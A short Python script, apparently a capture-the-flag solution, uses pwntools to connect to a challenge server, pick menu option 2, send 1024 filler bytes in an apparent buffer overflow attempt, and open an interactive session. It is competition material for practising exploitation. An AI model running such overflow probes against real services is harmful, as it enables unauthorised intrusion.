import pwn
HOST,PORT="chall.codefest.tech", 9000
REM = pwn.remote(HOST,PORT)

REM.send(b'2')
print(REM.recv(21))
REM.send(b'0'*1024)
print(REM.recv(1024))
REM.interactive()
